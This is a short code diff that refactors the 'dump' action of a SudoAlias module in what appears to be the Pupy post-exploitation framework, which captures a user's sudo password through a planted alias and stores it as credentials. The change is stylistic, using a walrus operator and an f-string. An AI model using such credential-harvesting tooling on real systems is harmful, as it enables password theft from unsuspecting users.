@@ -23,11 +23,8 @@ class SudoAlias(PupyModule):
             else:
                 self.success("the alias has been created. Waiting for a user to run a sudo command...")
         elif args.action=="dump":
-            data = self.client.conn.modules["sudo_alias"].sudo_alias_dump()
-            if not data:
-                self.error("nothing find, be patient !")
-            else:
-                self.success("Sudo password found: %s" % data)
+            if data := self.client.conn.modules["sudo_alias"].sudo_alias_dump():
+                self.success(f"Sudo password found: {data}")
 
                 # add password to the database
                 username = data.split('/')[0]
@@ -41,6 +38,8 @@ class SudoAlias(PupyModule):
                 }])
                 self.success("Credentials stored on the database")
 
+            else:
+                self.error("nothing find, be patient !")
         elif args.action=="stop":
             if not self.client.conn.modules["sudo_alias"].sudo_alias_stop():
                 self.error('the alias has not been created yet (run start)')
